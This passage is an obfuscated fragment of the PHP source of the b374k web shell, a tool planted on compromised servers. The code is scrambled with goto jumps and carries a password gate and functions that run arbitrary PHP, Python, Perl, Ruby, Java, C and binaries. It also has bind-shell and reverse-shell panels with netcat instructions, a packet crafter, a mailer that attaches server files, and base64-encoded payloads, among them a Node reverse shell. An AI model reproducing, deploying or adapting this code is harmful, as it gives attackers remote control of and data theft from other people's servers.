"</textarea></td></tr></table>"; goto Pmlh6; i38mc: do { $line = fgets($sock, 1024); if (trim($line) == "") { $counter++; } $bin .= $line; } while ($counter < $maxtry); goto ed3xG; qlRh3: $maxtry = 1; goto NtH0l; aQGwZ: $counter = 0; goto qlRh3; L10rf: $res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>" . html_safe($bin) . "</textarea></td></tr>"; goto WrVMu; rYsuu: stream_set_timeout($sock, $packetSTimeout); goto pAhPE; pAhPE: fwrite($sock, $packetContent . "\r\n\r\n\x00"); goto aQGwZ; NtH0l: $bin = ""; goto i38mc; ed3xG: fclose($sock); goto L10rf; Pmlh6: } goto TGRnn; l7zKk: if (ctype_xdigit($packetContent)) { $packetContent = @pack("H*", $packetContent); } else { $packetContent = str_replace(array("\r", "\n"), "", $packetContent); $packetContent = str_replace(array("\\r", "\\n"), array("\r", "\n"), $packetContent); } goto otwHT; NoG0P: $packetSTimeout = (int) $p['packetSTimeout']; goto nJ1_3; be2wu: $sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout); goto sGypt; XkIEy: if (!preg_match("/[a-z0-9]+:\\/\\/.*/", $packetHost)) { $packetHost = "tcp://" . $packetHost; } goto OWxf1; nJ1_3: $packetContent = $p['packetContent']; goto l7zKk; b0ANa: } goto d3Kjj; E_pd2: echo get_resource('arrow'); goto WUPPK; EHCt2: ?></a></span>
			<img onclick='viewfileorfolder();' id='b374k' src='<?php  goto fREE1; zm_k0: if (!function_exists('auth')) { function auth() { if (isset($GLOBALS['pass']) && trim($GLOBALS['pass']) != '') { goto BoxI4; QKRoa: $p = $_POST; goto k_RHJ; BoxI4: $c = $_COOKIE; goto QKRoa; oGlmN: if (!isset($c['pass']) || isset($c['pass']) && $c['pass'] != $GLOBALS['pass']) { goto V5j64; iBEVU: die; goto M06wX; V5j64: $res = "<!doctype html>\n\t\t<html>\n\t\t<head>\n\t\t<meta charset='utf-8'>\n\t\t<meta name='robots' content='noindex, nofollow, noarchive'>\n\t\t<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>\n\t\t</head>\n\t\t<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>\n\t\t<script type='text/javascript'>\n\t\tvar d = document;\n\t\td.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");\n\t\td.getElementById('pass').focus();\n\t\td.getElementById('pass').setAttribute('autocomplete', 'off');\n\t\t</script>\n\t\t</body></html>\n\t\t"; goto Vg8Gb; Vg8Gb: echo $res; goto iBEVU; M06wX: } goto WUcCj; k_RHJ: if (isset($p['pass'])) { $your_pass = sha1(md5($p['pass'])); if ($your_pass == $GLOBALS['pass']) { setcookie("pass", $your_pass, time() + 36000, "/"); header("Location: " . get_self()); } } goto oGlmN; WUcCj: } } } goto wq59L; Z5MrS: block_bot(); goto u0hFY; fdNuo: if (!function_exists('get_resource')) { function get_resource($type) { if (isset($GLOBALS['resources'][$type])) { return gzinflate(base64_decode($GLOBALS['resources'][$type])); } return false; } } goto U8qM_; wQXBM: if (!function_exists('fix_magic_quote')) { function fix_magic_quote($arr) { goto U1mHx; vbZRU: if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) { if (is_array($arr)) { foreach ($arr as $k => $v) { if (is_array($v)) { $arr[$k] = clean($v); } else { $arr[$k] = empty($quotes_sybase) || $quotes_sybase === 'off' ? stripslashes($v) : stripslashes(str_replace("\\'\\'", "\\'", $v)); } } } } goto YYTTc; YYTTc: return $arr; goto z0ZnL; U1mHx: $quotes_sybase = strtolower(ini_get('magic_quotes_sybase')); goto vbZRU; z0ZnL: } } goto q0rfK; XBdfd: $GLOBALS['module']['info']['id'] = "info"; goto ADdkp; rVaUJ: if (!function_exists('find_git_repo')) { function find_git_repo($path) { if (dirname($path) == DIRECTORY_SEPARATOR) { return false; } else { if (is_dir(dirname($path) . DIRECTORY_SEPARATOR . ".git")) { return dirname($path) . DIRECTORY_SEPARATOR . ".git"; } else { return find_git_repo(dirname($path)); } } } } goto Z5MrS; CHCYS: $GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>"; goto p8wIF; ssZyA: if (!function_exists('is_git_repo')) { function is_git_repo() { return boolval(find_git_repo(getcwd() . DIRECTORY_SEPARATOR . ".git")); } } goto rVaUJ; gpfON: if (!function_exists('format_bit')) { function format_bit($size) { goto gXa2I; oDDgz: return round(pow(1024, $base - floor($base)), 2) . " " . $suffixes[floor($base)]; goto qLYLK; gXa2I: $base = log($size) / log(1024); goto hPyq5; hPyq5: $suffixes = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'); goto oDDgz; qLYLK: } } goto FAZSs; AlrS4: $GLOBALS['module']['database']['id'] = "database"; goto TU0sf; lRj0z: echo implode(",", $GLOBALS['module_to_load']); goto HSGvJ; WUPPK: ?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
#totop:hover,#tobottom:hover{opacity:0.80;}
#toggleBasicInfo{display:none;float:right;margin:0;}
#basicInfoSplitter{display:none;}
#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
#showinfo{float:right;display:none;}
#logout{float:right;}
.git_alert{font-weight: bold; color:#ef793e; font-size: 16px;}
</style>
</head>
<body>
<!--wrapper start-->
<div id='wrapper'>
	<!--header start-->
	<div id='header'>
		<!--header info start-->
		<div id='headerNav'>
			<span><a onclick="set_cookie('cwd', '');" href='<?php  goto cLdO4; mMvGx: $GLOBALS['resources']['arrow'] = "FZXHDqtYDIYfKCPRS2Z0F4cSem+BHfVQA6HD00+uF/Zny2XzSy7SNf23GVJYItMH/pelS0mT/zQhZ7kHqklwBD8zvaAWA/gj/m8KIA/iX+Du8jOjfwv8m1Oit/Gjxfs5XYSyR7wZ9sdiLPaiE7rxwYZvDz3z0G0fN9Pt1PqiDLuyRgzA7sVpo2NvL3Cdy6p1eSS3Um21eZqfW2uc6Xc9STYjG0E8zybZ3lxYrGLgmij6FTgD+oE1fHzRyB9IXpIFlT+6J8XARNRivqAELyNW694fBYKgdQ54i2RquOgoIwOqEpRK6G66qk4HjFCAWX9NRp5cU6hMsdvSQhiGCXr7Hmfyl/TaR9KwjDxldWNp9wx7zux2sY0uWUABDxUQWhoG2Dt8WlOYIuH8fjpej0l0Ag3k01AHYyLNNo7exzAS7jczTk5oogzNlETVL5g2TcLYQI7n5y+9dRXzgN4z19fKr4mPCsLm+Z4fhc9nFab7ORjMJSOarH0XxJM8bMHBKhENzgreEnB4RwFNgUb1wm6yMFd9syRt0rPChFJ4e7D2md63/czFE+B2LsNxEpkwZeLntSUuUyuCTZGb0bYMBi9PfT3ACaK/fYdUE8GzeuLXbI0WiI/zRT7snWMV7vXc0BLFwQvIfSYKjgtoIiKJO8reFV4ahnMA1JRdKx1HMiyyMoZnMgQX7W2Jb4/tudaDRtJOUgZY5FAFbpEnYQiABEU5E+XyKu3pqRizh676B29Ssyk1ZZcZwLKwlms5igcnOp1+1ekSSQK9Lv0S2ZnH92jrgEbjN0b9dO44OK4Z4mIc2VxoxxZepzO+WLzcJrra8wYG5RKqDNe3w+ODQnrPzk+OyZo+z8kL8HK3XNhcc7Cy92cVYW3WsVZpSzZCVEopMlUun/XlOFzTWnVpt8ShAFmZsxVB3sNWkvLAUSxdyhWMgea1yH4jJVBb3QaAFPrxU3v6VD7DsFpOCVxSwRZsTFsw6Ga1qFmVUxS3tV9WjJkhkxZAMaHLA7+0NJ7dy9abkmqhppR9oAYIJM9g3OHTD+8+wQtkYMCiHSxQxMEzWvkktKPzgskfd/F3m4WH09lAfUtThQ+JA2pMvbnJ6t8SLwdtzXvR47Ze0Z0VkC5F6c7eSxl6n8/pudIYGl89MitzIHEuXxVYD3J+qt9oQ4PJqsQjEOewetHZEUf8UCRYjHw7vmxoe0Bjtx59p4PftRrDqXDRXTLqQ1NGLVE613PVZmyaiRe6SnV9b8SCdA91B7a1hB8RS3xWHIXdY6T9TwCc0xRi3IZGTB74VSs6rLkrXVm0jVjjQNstEz3DCNOpVy3Xk91cVJxbaOKEbFvrQCy2fxSUzhanvPq5bmccNWTPG3UbMsXoPWSS5TTTvo/W8LsiZ6Sdzdm2qGSqJapvuncb/jlI1c4i60NN53TasogwL0a/GFnyF4lgiGXW2N7BNyL5EEyQA42LdZtao2S9f+reA04QDbaEQtRg0YRlb/E0ksyci4MM1HlVvvqQlz0aqMXesslvqz7Y4baL0WvNHvflRnLNxLR5IFfb9KrZT97Lotz8OFtJJj9ugSFhVYy9nzcuRvC+vbF6zdrWpYtPek+rxjaeMog4pvOIbJ3wOTQmFb3d/atN9HV7ZsuZFAIRngh0oVQKZXb+fgBOdQNKnDsVQvjnz/8="; goto A297u; WG5Fc: $GLOBALS['title'] = "b374k"; goto aTi_J; FH892: if (!function_exists('sql_fetch_data')) { function sql_fetch_data($sqltype, $result) { if ($sqltype == 'mysql') { if (class_exists('mysqli_result')) { return $result->fetch_row(); } elseif (function_exists('mysql_fetch_row')) { return mysql_fetch_row($result); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_fetch_array')) { return sqlsrv_fetch_array($result, 1); } elseif (function_exists('mssql_fetch_row')) { return mssql_fetch_row($result); } } elseif ($sqltype == 'pgsql') { return pg_fetch_row($result); } elseif ($sqltype == 'oracle') { return oci_fetch_row($result); } elseif ($sqltype == 'sqlite3') { return $result->fetchArray(1); } elseif ($sqltype == 'sqlite') { return sqlite_fetch_array($result, 1); } elseif ($sqltype == 'odbc') { return odbc_fetch_array($result); } elseif ($sqltype == 'pdo') { return $result->fetch(2); } } } goto SFKrU; TU0sf: $GLOBALS['module']['database']['title'] = "Database"; goto mx4tc; EmzG3: $GLOBALS['module']['network']['content'] = "\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>\n</thead>\n<tbody>\n\t<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='" . $server_addr . "' disabled></td></tr>\n\t<tr><td>Port</td><td><input type='text' id='bindPort' value='" . $default_port . "' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>\n</tbody>\n<tfoot>\n\t<tr>\n\t\t<td style='width:144px;'>\n\t\t\t<select id='bindLang' class='rsType'>\n\t\t\t\t" . $winbinary . "\n\t\t\t</select>\n\t\t</td>\n\t\t<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>\n\t</tr>\n\t<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>\n</tfoot>\n</table>\n<br>\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>\n</thead>\n<tbody>\n\t<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='" . $remote_addr . "' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>\n\t<tr><td>Port</td><td><input type='text' id='backPort' value='" . $default_port . "' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>\n</tbody>\n<tfoot>\n\t<tr>\n\t\t<td style='width:144px;'>\n\t\t\t<select id='backLang' class='rsType'>\n\t\t\t\t" . $winbinary . "\n\t\t\t</select>\n\t\t</td>\n\t\t<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>\n\t</tr>\n\t<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>\n</tfoot>\n</table>\n<br>\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>\n</thead>\n<tbody>\n\t<tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://" . $server_addr . "' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>\n\t<tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>\n\t<tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>\n\t<tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>\n\t<tr><td>Stream Timeout</td><td><input type='text' id='packetSTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>\n</tbody>\n<tfoot>\n\t<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\n\\r\\n</textarea></td></tr>\n\t<tr>\n\t\t<td>\n\t\t\t<span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span>\n\t\t</td>\n\t\t<td>You can also press ctrl+enter to submit</td>\n\t</tr>\n\t<tr><td colspan='2'><div id='packetResult'></div></td></tr>\n</tfoot>\n</table>\n"; goto A_Tav; pTOYu: if (isset($p['mailFrom']) && isset($p['mailTo']) && isset($p['mailSubject']) && isset($p['mailContent'])) { goto sXGaF; uOMFm: $mailAttachment = !empty($mailAttachment) ? explode("{[|b374k|]}", $p['mailAttachment']) : array(); goto Vnt9t; e03rx: $mailTo = trim($p['mailTo']); goto CHRZM; JKBys: $mailContent = trim($p['mailContent']); goto nv0bV; CHRZM: $mailSubject = trim($p['mailSubject']); goto JKBys; CXx30: if (!empty($mailFrom)) { $mailFrom = "From: " . $mailFrom . "\r\nReply-To: " . $mailFrom . "\r\n"; } goto kcCih; NUirL: output("Failed to send mail"); goto F4cHr; Vnt9t: if (empty($mailTo)) { output("Please specify at least one recipient"); } goto CXx30; sXGaF: $mailFrom = trim($p['mailFrom']); goto e03rx; kcCih: foreach ($mailAttachment as $file) { goto bon17; JIoaI: if (empty($file)) { continue; } goto Pfp47; bon17: $file = trim($file); goto JIoaI; Pfp47: if (!is_file($file)) { output("No such file : " . $file); } goto che1m; che1m: } goto WKITs; WKITs: if (send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) { output("Mail sent to " . html_safe($mailTo)); } goto NUirL; nv0bV: $mailAttachment = trim($p['mailAttachment']); goto uOMFm; F4cHr: } goto ofgSz; GmKDH: $GLOBALS['resources']['rs_node'] = "nVHLbsIwEDwbiX+IcokjIVsqSJVAnPoJPdKHjLNgq46T2g5UQvx7/QgU6ENVcrCyO7Ozu7OUZsK51s4p3UonujXhTU3X0/vZW3rHox0zmW3ZXmfLzMB7Jw3gggupqtfWNBysLUoSCYtE1uAuqT4syh6yzgCrL9GUORN4o22j4KpVSkVKryJAKU8p6FpqakXhEbnB/TSkVcxtGlOTmjkuMH3Ze5Ysy686XlcEPqA4KzKz3XngpBDCpBn+iAK9dWK5nJaH8QgFvvBkvxfhfngHj2B2YPCm09zJRmMbeciSvZEOcB6N7LvPw4oauIPqSedhp6z/0mZeOHqJI/0St4JYV0lNDNiuBlzeQk3niO+eV8yxfHKaJsMhLg+naWK0OH5XBmMGlv9Vdhr6WzVKryBKWgc6Or26ew7J43gEykJ26//s7L+98v8hORqs71Um8aKraZT77yHQbxdAP1iPBnqOBpqNhrl8/AQ="; goto Y8p3G; ubv7w: @ini_set('display_errors', '1'); goto LzHDm; JKgwR: $error_html = !empty($error) ? "<pre class='phpError border'>" . str_replace("\n\n", "\n", html_safe($error)) . "</pre>" : ""; goto daKDH; k4FKb: foreach ($GLOBALS['module_to_load'] as $k) { $content = $GLOBALS['module'][$k]['content']; echo "<div class='menucontent' id='" . $GLOBALS['module'][$k]['id'] . "'>" . $content . "</div>"; } goto s1KPS; J9bv6: echo is_win() ? 'true' : 'false'; goto vln6B; ADdkp: $GLOBALS['module']['info']['title'] = "Info"; goto tzxqm; hQ5aK: $GLOBALS['module']['explorer']['title'] = "Explorer"; goto weXrT; lAXQ5: if (!function_exists('copys')) { function copys($source, $target, $c = 0) { goto geH6k; BTWKj: if ($dh = opendir($source)) { goto bENDo; bENDo: if (!is_dir($target)) { mkdir($target); } goto grNVJ; grNVJ: $target = realpath($target) . DIRECTORY_SEPARATOR; goto xMVZr; SX4Wu: closedir($dh); goto EuSN1; xMVZr: while (($f = readdir($dh)) !== false) { if ($f != '.' && $f != '..') { if (is_dir($source . $f)) { copys($source . $f, $target . $f, $c); } else { if (copy($source . $f, $target . $f)) { $c++; } } } } goto SX4Wu; EuSN1: } goto pvZwC; geH6k: $source = realpath($source) . DIRECTORY_SEPARATOR; goto BTWKj; pvZwC: return $c; goto EssRb; EssRb: } } goto z0p3Q; YxIIQ: if (!function_exists('get_cwd')) { function get_cwd() { goto PsWIS; PsWIS: $cwd = getcwd() . DIRECTORY_SEPARATOR; goto g4l4U; myhZm: return $cwd; goto Okdp3; g4l4U: if (!isset($_COOKIE['cwd'])) { setcookie("cwd", $cwd); } else { $cwd_c = rawurldecode($_COOKIE['cwd']); if (is_dir($cwd_c)) { $cwd = realpath($cwd_c) . DIRECTORY_SEPARATOR; } else { setcookie("cwd", $cwd); } } goto myhZm; Okdp3: } } goto AHemz; QklNo: if (!function_exists('sql_connect')) { function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass) { if ($sqltype == 'mysql') { if (class_exists('mysqli')) { return new mysqli($sqlhost, $sqluser, $sqlpass); } elseif (function_exists('mysql_connect')) { return @mysql_connect($sqlhost, $sqluser, $sqlpass); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_connect')) { $coninfo = array("UID" => $sqluser, "PWD" => $sqlpass); return @sqlsrv_connect($sqlhost, $coninfo); } elseif (function_exists('mssql_connect')) { return @mssql_connect($sqlhost, $sqluser, $sqlpass); } } elseif ($sqltype == 'pgsql') { goto yK3Vs; qo0RT: if (count($hosts) == 2) { $host_str = "host=" . $hosts[0] . " port=" . $hosts[1]; } else { $host_str = "host=" . $sqlhost; } goto F2b2Z; F2b2Z: if (function_exists('pg_connect')) { return @pg_connect("{$host_str} user={$sqluser} password={$sqlpass}"); } goto MBJ7b; yK3Vs: $hosts = explode(":", $sqlhost); goto qo0RT; MBJ7b: } elseif ($sqltype == 'oracle') { if (function_exists('oci_connect')) { return @oci_connect($sqluser, $sqlpass, $sqlhost); } } elseif ($sqltype == 'sqlite3') { if (class_exists('SQLite3')) { if (!empty($sqlhost)) { return new SQLite3($sqlhost); } else { return false; } } } elseif ($sqltype == 'sqlite') { if (function_exists('sqlite_open')) { return @sqlite_open($sqlhost); } } elseif ($sqltype == 'odbc') { if (function_exists('odbc_connect')) { return @odbc_connect($sqlhost, $sqluser, $sqlpass); } } elseif ($sqltype == 'pdo') { if (class_exists('PDO')) { if (!empty($sqlhost)) { return new PDO($sqlhost, $sqluser, $sqlpass); } else { return false; } } } return false; } } goto MyofM; zAQAl: if (isset($p['viewEntry'])) { $path = trim($p['viewEntry']); if (is_file($path)) { goto ZNfQm; Otuk8: chdir($dirname); goto bLhTy; ZNfQm: $dirname = realpath(dirname($path)) . DIRECTORY_SEPARATOR; goto DPmCL; bLhTy: $nav = get_nav($dirname); goto PIICf; ifdYZ: $explorer_content = view_file($path, "auto"); goto jSq2V; DPmCL: setcookie("cwd", $dirname); goto Otuk8; PIICf: $cwd = html_safe($dirname); goto ifdYZ; jSq2V: } elseif (is_dir($path)) { goto oyhdr; U0oyD: $cwd = html_safe($path); goto QoY_K; oyhdr: $path = realpath($path) . DIRECTORY_SEPARATOR; goto uY_RE; QoY_K: $explorer_content = show_all_files($path); goto Q1zZt; S1sVR: chdir($path); goto cdRIw; uY_RE: setcookie("cwd", $path); goto S1sVR; cdRIw: $nav = get_nav($path); goto U0oyD; Q1zZt: } } else { $explorer_content = show_all_files(get_cwd()); } goto yl4rN; bzIH1: $res = ""; goto GmGvp; bpj6x: if (!function_exists('get_post')) { function get_post() { return fix_magic_quote($_POST); } } goto rWVzW; cLdO4: echo get_self(); goto uSwBd; tnbeJ: if (!function_exists('eval_go')) { function eval_go($evalType, $evalCode, $evalOptions, $evalArguments) { goto X6NJH; HOiOH: if ($evalOptions != "") { $evalOptions = $evalOptions . " "; } goto f5crs; X6NJH: $res = ""; goto BLJvE; StlHI: if ($evalType == "php") { goto t982C; MIw7U: ob_end_clean(); goto BicP4; t982C: ob_start(); goto rEI5i; BicP4: return $res; goto Fi1cV; OFcOM: $res = ob_get_contents(); goto MIw7U; rEI5i: eval($evalCode); goto OFcOM; Fi1cV: } elseif ($evalType == "python" || $evalType == "perl" || $evalType == "ruby" || $evalType == "node" || $evalType == "nodejs") { goto L6HTO; L6HTO: $tmpdir = get_writabledir(); goto ptCua; HAA20: $res .= "Using dir : " . $tmpdir; goto NDMHC; NDMHC: if (is_writable($tmpdir)) { goto zaHlb; h_57E: $path = $filename; goto LrrNV; v807j: $uniq = substr(md5(time()), 0, 8); goto Zxe_e; Zxe_e: $filename = $evalType . $uniq; goto h_57E; wYfm1: if (write_file($path, $evalCode)) { goto Uw3lF; zmgK8: $res .= "Setting permissions : 0755"; goto lG5SS; pDQ2q: $res .= "Deleting temporary file : " . $path; goto kU0Vq; lG5SS: if (chmod($path, 0755)) { goto n4ad8; n4ad8: $res .= " (ok)\n"; goto OU_0n; EYVTA: $output = execute($cmd); goto rRJWY; uoley: $res .= "Execute : " . $cmd . "\n"; goto EYVTA; OU_0n: $cmd = $evalType . " " . $evalOptions . $path . $evalArguments; goto uoley; rRJWY: } else { $res .= " (failed)\n"; } goto pDQ2q; kU0Vq: if (unlink($path)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto f01ZO; Uw3lF: $res .= " (ok)\n"; goto zmgK8; f01ZO: } else { $res .= " (failed)\n"; } goto Uz288; zaHlb: $res .= " (writable)\n"; goto v807j; LrrNV: $res .= "Temporary file : " . $path; goto wYfm1; Uz288: } else { $res .= " (not writable)\n"; } goto jDDTU; dKxlw: return $res . "{[|b374k|]}" . $output; goto Lfegt; jDDTU: $res .= "Finished..."; goto dKxlw; ptCua: chdir($tmpdir); goto HAA20; Lfegt: } elseif ($evalType == "gcc") { goto mbovT; kORVG: $res .= "Finished..."; goto ivw_t; ivw_t: return $res . "{[|b374k|]}" . $output; goto HRT3l; tVkTz: chdir($tmpdir); goto DLioa; rjYaL: if (is_writable($tmpdir)) { goto dX7SJ; Gdr63: if (write_file($path, $evalCode)) { goto hfA8M; hfA8M: $res .= " (ok)\n"; goto LQbbK; LQbbK: $ext = is_win() ? ".exe" : ".out"; goto u7Ksm; bkZRx: $cmd = "gcc " . $evalOptions . $path; goto R1nR4; R1nR4: $res .= "Compiling : " . $cmd; goto Rxt3l; uQgUn: if (is_file($pathres)) { goto qCfhC; ZXhO0: if (unlink($pathres)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto XPyom; zJNoI: if (chmod($pathres, 0755)) { goto zVvwN; QLQ9B: $res .= "Execute : " . $cmd . "\n"; goto U56DX; OGXUo: $cmd = $pathres . $evalArguments; goto QLQ9B; zVvwN: $res .= " (ok)\n"; goto OGXUo; U56DX: $output = execute($cmd); goto Ws8WX; Ws8WX: } else { $res .= " (failed)\n"; } goto LJaSd; qCfhC: $res .= " (ok)\n"; goto edBFq; edBFq: $res .= "Setting permissions : 0755"; goto zJNoI; LJaSd: $res .= "Deleting temporary file : " . $pathres; goto ZXhO0; XPyom: } else { $res .= " (failed)\n"; } goto MXblK; xr31u: if (unlink($path)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto EwuTM; LN8Kk: $evalOptions = "-o " . $pathres . " " . $evalOptions; goto bkZRx; MXblK: $res .= "Deleting temporary file : " . $path; goto xr31u; Rxt3l: $res .= execute($cmd); goto uQgUn; u7Ksm: $pathres = $filename . $ext; goto LN8Kk; EwuTM: } else { $res .= " (failed)\n"; } goto klO5N; jk9Qt: $uniq = substr(md5(time()), 0, 8); goto p0gUC; dX7SJ: $res .= " (writable)\n"; goto jk9Qt; p0gUC: $filename = $evalType . $uniq . ".c"; goto Ut13x; D0l8C: $res .= "Temporary file : " . $path; goto Gdr63; Ut13x: $path = $filename; goto D0l8C; klO5N: } else { $res .= " (not writable)\n"; } goto kORVG; DLioa: $res .= "Using dir : " . $tmpdir; goto rjYaL; mbovT: $tmpdir = get_writabledir(); goto tVkTz; HRT3l: } elseif ($evalType == "java") { goto KSNY2; oueOW: return $res . "{[|b374k|]}" . $output; goto bS2n2; BpcRp: if (is_writable($tmpdir)) { goto EBkft; FI5yr: if (write_file($path, $evalCode)) { goto F5dNA; B2GS7: $res .= "Deleting temporary file : " . $path; goto JclzD; sF9Ix: $pathres = $filename . ".class"; goto J_Nyi; yNUht: $cmd = "javac " . $evalOptions . $path; goto KcU3i; J_Nyi: if (is_file($pathres)) { goto thdyj; thdyj: $res .= " (ok)\n"; goto q7Svt; q7Svt: $res .= "Setting permissions : 0755"; goto rT1JE; rT1JE: if (chmod($pathres, 0755)) { goto vlRL8; vlRL8: $res .= " (ok)\n"; goto XfO29; H__2h: $output = execute($cmd); goto HiO5t; JdF3i: $res .= "Execute : " . $cmd . "\n"; goto H__2h; XfO29: $cmd = "java " . $filename . $evalArguments; goto JdF3i; HiO5t: } else { $res .= " (failed)\n"; } goto PTPo5; Pw2Tl: if (unlink($pathres)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto fkQEL; PTPo5: $res .= "Deleting temporary file : " . $pathres; goto Pw2Tl; fkQEL: } else { $res .= " (failed)\n"; } goto B2GS7; KcU3i: $res .= "Compiling : " . $cmd; goto jvyiU; jvyiU: $res .= execute($cmd); goto sF9Ix; F5dNA: $res .= " (ok)\n"; goto yNUht; JclzD: if (unlink($path)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto RjKdV; RjKdV: } else { $res .= " (failed)\n"; } goto U43w4; JJXef: if (preg_match("/class\\ ([^{]+){/i", $evalCode, $r)) { $classname = trim($r[1]); $filename = $classname; } else { goto yI10D; yI10D: $uniq = substr(md5(time()), 0, 8); goto XpsK1; XpsK1: $filename = $evalType . $uniq; goto VvAix; VvAix: $evalCode = "class " . $filename . " { " . $evalCode . " } "; goto jiT_5; jiT_5: } goto xg6l7; EBkft: $res .= " (writable)\n"; goto JJXef; xg6l7: $path = $filename . ".java"; goto QX3cZ; QX3cZ: $res .= "Temporary file : " . $path; goto FI5yr; U43w4: } else { $res .= " (not writable)\n"; } goto iO33t; T7UJv: $res .= "Using dir : " . $tmpdir; goto BpcRp; iO33t: $res .= "Finished..."; goto oueOW; XmeIr: chdir($tmpdir); goto T7UJv; KSNY2: $tmpdir = get_writabledir(); goto XmeIr; bS2n2: } elseif ($evalType == "executable") { goto el5KG; TxovR: $res .= "Using dir : " . $tmpdir; goto uciXi; el5KG: $tmpdir = get_writabledir(); goto WYRf_; TC0GU: return $res . "{[|b374k|]}" . $output; goto v783R; TUewI: $res .= "Finished..."; goto TC0GU; WYRf_: chdir($tmpdir); goto TxovR; uciXi: if (is_writable($tmpdir)) { goto dX4vl; CcOhV: if (write_file($path, $evalCode)) { goto RWkn_; CDzDh: $res .= "Execute : " . $cmd . "\n"; goto CPFA6; RWkn_: $res .= " (ok)\n"; goto JXWKT; uQdzK: $res .= "Deleting temporary file : " . $path; goto AJSnO; AJSnO: if (unlink($path)) { $res .= " (ok)\n"; } else { $res .= " (failed)\n"; } goto FVTra; CPFA6: $output = execute($cmd); goto uQdzK; JXWKT: $cmd = $path . $evalArguments; goto CDzDh; FVTra: } else { $res .= " (failed)\n"; } goto PGkF_; MIWGa: $filename = $evalType . $uniq . ".exe"; goto oQVl0; BMVPF: $uniq = substr(md5(time()), 0, 8); goto MIWGa; dX4vl: $res .= " (writable)\n"; goto BMVPF; F15Qt: $res .= "Temporary file : " . $path; goto CcOhV; oQVl0: $path = $filename; goto F15Qt; PGkF_: } else { $res .= " (not writable)\n"; } goto TUewI; v783R: } goto QseQk; QseQk: return false; goto VjnQZ; f5crs: if ($evalArguments != "") { $evalArguments = " " . $evalArguments; } goto StlHI; BLJvE: $output = ""; goto HOiOH; VjnQZ: } } goto y_jgg; QDQIN: ?>
		</div>
		<!--menu end-->

	</div>
	<!--header end-->

	<!--content start-->
	<div id='content'>
		<!--server info start-->
		<div id='basicInfo'>
			<div id='toggleBasicInfo'></div>
			<?php  goto LosYP; SFKrU: if (!function_exists('sql_close')) { function sql_close($sqltype, $con) { if ($sqltype == 'mysql') { if (class_exists('mysqli')) { return $con->close(); } elseif (function_exists('mysql_close')) { return mysql_close($con); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_close')) { return sqlsrv_close($con); } elseif (function_exists('mssql_close')) { return mssql_close($con); } } elseif ($sqltype == 'pgsql') { return pg_close($con); } elseif ($sqltype == 'oracle') { return oci_close($con); } elseif ($sqltype == 'sqlite3') { return $con->close(); } elseif ($sqltype == 'sqlite') { return sqlite_close($con); } elseif ($sqltype == 'odbc') { return odbc_close($con); } elseif ($sqltype == 'pdo') { return $con = null; } } } goto mvDI2; yl4rN: $GLOBALS['module']['explorer']['id'] = "explorer"; goto hQ5aK; LzHDm: @ini_set('display_startup_errors', '1'); goto q8u9z; d3Kjj: $GLOBALS['module']['processes']['id'] = "processes"; goto n5vWi; mIXut: echo $GLOBALS['title'] . " " . $GLOBALS['ver']; goto dzwZx; GzRGy: $GLOBALS['module_to_load'] = array("explorer", "terminal", "eval", "convert", "database", "info", "mail", "network", "processes"); goto SkmcN; q0rfK: if (!function_exists('execute')) { function execute($code) { goto V99Lq; Cq8yG: return ""; goto OKb17; u2cRx: if (is_callable('system') && function_exists('system')) { goto 